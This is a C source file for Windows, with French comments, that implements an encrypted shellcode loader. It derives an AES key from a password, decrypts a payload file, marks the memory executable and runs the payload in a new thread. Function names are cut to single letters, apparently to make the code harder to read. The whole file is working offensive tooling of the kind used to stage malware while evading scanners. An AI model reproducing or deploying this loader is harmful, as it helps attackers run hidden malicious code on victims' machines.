#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment(lib, "crypt32.lib")

// Structures pour le format minimal
typedef struct {
    BYTE salt[32];
    BYTE iv[16];     // Renommé iv au lieu de nonce pour CBC
    BYTE *ct;
    SIZE_T ct_len;
} D;

// Fonctions principales (noms minimalistes)
BYTE* r(const char* f, SIZE_T* s) {
    HANDLE h = CreateFileA(f, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE) {
        CloseHandle(h); return NULL;
    }
    
    BYTE* b = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!b) {
        CloseHandle(h); return NULL;
    }
    
    DWORD rd;
    if (!ReadFile(h, b, sz, &rd, NULL) || rd != sz) {
        VirtualFree(b, 0, MEM_RELEASE);
        CloseHandle(h); return NULL;
    }
    
    CloseHandle(h);
    *s = sz;
    return b;
}

BOOL p(BYTE* d, SIZE_T len, D* out) {
    if (len < 52) return FALSE;  // Vérification longueur minimale
    
    // Vérifier format d'entête
    if (d[0] != 1) return FALSE;  // Version
    if (d[1] != 2) return FALSE;  // Algo (2=CBC)
    
    // Lecture correcte des tailles au format big-endian
    WORD salt_len = (d[2] << 8) | d[3];
    WORD iv_len = (d[4] << 8) | d[5];
    
    if (salt_len != 32 || iv_len != 16) return FALSE;
    
    SIZE_T pos = 6;  // Position après l'en-tête
    memcpy(out->salt, d + pos, salt_len);
    pos += salt_len;
    
    memcpy(out->iv, d + pos, iv_len);
    pos += iv_len;
    
    out->ct_len = len - pos;
    out->ct = d + pos;
    
    return TRUE;
}

BOOL k(const char* pwd, const BYTE* salt, BYTE* key) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL result = FALSE;
    
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return FALSE;
    
    // Limiter la longueur du mot de passe pour éviter les débordements
    SIZE_T pwd_len = strlen(pwd);
    if (pwd_len > 1024) pwd_len = 1024;  // Limite raisonnable
    
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, pwd_len + 32, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    memcpy(buf, pwd, pwd_len);
    memcpy(buf + pwd_len, salt, 32);
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        goto end;
    
    for (int i = 0; i < 100000; i++) {
        if (!CryptHashData(hHash, buf, pwd_len + 32, 0)) {
            goto end;
        }
        
        if (i == 99999) {
            DWORD hash_len = 32;
            result = CryptGetHashParam(hHash, HP_HASHVAL, key, &hash_len, 0);
        }
        
        if (i < 99999) {
            BYTE temp[32];
            DWORD temp_len = sizeof(temp);
            CryptGetHashParam(hHash, HP_HASHVAL, temp, &temp_len, 0);
            CryptDestroyHash(hHash);
            CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
            
            memcpy(buf, temp, temp_len);
            memcpy(buf + temp_len, salt, 32);
            CryptHashData(hHash, buf, temp_len + 32, 0);
        }
    }
    
end:
    // Effacement sécurisé avec volatilité
    volatile BYTE* secure_ptr = (volatile BYTE*)buf;
    for (SIZE_T i = 0; i < pwd_len + 32; i++) secure_ptr[i] = 0;
    
    VirtualFree(buf, 0, MEM_RELEASE);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return result;
}

BOOL d(const BYTE* key, const BYTE* iv, const BYTE* ct, SIZE_T ct_len, BYTE* pt) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BOOL result = FALSE;
    
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    BYTE kb[sizeof(BLOBHEADER) + sizeof(DWORD) + 32] = {0};
    BLOBHEADER* h = (BLOBHEADER*)kb;
    DWORD* ks = (DWORD*)(kb + sizeof(BLOBHEADER));
    BYTE* kd = kb + sizeof(BLOBHEADER) + sizeof(DWORD);
    
    h->bType = PLAINTEXTKEYBLOB;
    h->bVersion = CUR_BLOB_VERSION;
    h->reserved = 0;
    h->aiKeyAlg = CALG_AES_256;
    *ks = 32;
    memcpy(kd, key, 32);
    
    if (!CryptImportKey(hProv, kb, sizeof(kb), 0, 0, &hKey)) {
        goto end;
    }
    
    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);
    
    memcpy(pt, ct, ct_len);
    DWORD pt_len = ct_len;
    
    result = CryptDecrypt(hKey, 0, TRUE, 0, pt, &pt_len);
    
    // Supprimer le rembourrage PKCS#7 après déchiffrement
    if (result && pt_len > 0) {
        BYTE pad_len = pt[pt_len - 1];
        if (pad_len > 0 && pad_len <= 16) {
            // Vérifier que tous les octets de rembourrage sont corrects
            BOOL valid_padding = TRUE;
            for (BYTE i = 1; i <= pad_len; i++) {
                if (pt_len - i >= pt_len || pt[pt_len - i] != pad_len) {
                    valid_padding = FALSE;
                    break;
                }
            }
            
            if (valid_padding) {
                // Effacer le rembourrage
                for (BYTE i = 1; i <= pad_len; i++) {
                    if (pt_len - i < pt_len) {
                        pt[pt_len - i] = 0;
                    }
                }
            }
        }
    }
    
end:
    // Effacement sécurisé
    volatile BYTE* secure_ptr = (volatile BYTE*)kb;
    for (SIZE_T i = 0; i < sizeof(kb); i++) secure_ptr[i] = 0;
    
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return result;
}

BOOL x(BYTE* sc, SIZE_T sz) {
    LPVOID mem = VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!mem) return FALSE;
    
    memcpy(mem, sc, sz);
    
    DWORD old;
    if (!VirtualProtect(mem, sz, PAGE_EXECUTE_READ, &old))
        return FALSE;
    
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!h) return FALSE;
    
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    
    return TRUE;
}

int main(int argc, char** argv) {
    // Vérification minimaliste des arguments
    if (argc < 3) return 1;
    
    SIZE_T sz = 0;
    BYTE* data = r(argv[1], &sz);
    if (!data) return 1;
    
    D payload = {0};
    if (!p(data, sz, &payload)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }
    
    BYTE key[32] = {0};
    if (!k(argv[2], payload.salt, key)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }
    
    BYTE* pt = (BYTE*)VirtualAlloc(NULL, payload.ct_len, MEM_COMMIT, PAGE_READWRITE);
    if (!pt) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }
    
    if (!d(key, payload.iv, payload.ct, payload.ct_len, pt)) {
        volatile BYTE* secure_ptr = (volatile BYTE*)key;
        for (SIZE_T i = 0; i < 32; i++) secure_ptr[i] = 0;
        VirtualFree(pt, 0, MEM_RELEASE);
        VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }
    
    VirtualFree(data, 0, MEM_RELEASE);
    volatile BYTE* secure_ptr = (volatile BYTE*)key;
    for (SIZE_T i = 0; i < 32; i++) secure_ptr[i] = 0;
    
    BOOL res = x(pt, payload.ct_len);
    VirtualFree(pt, 0, MEM_RELEASE);
    
    return res ? 0 : 1;
}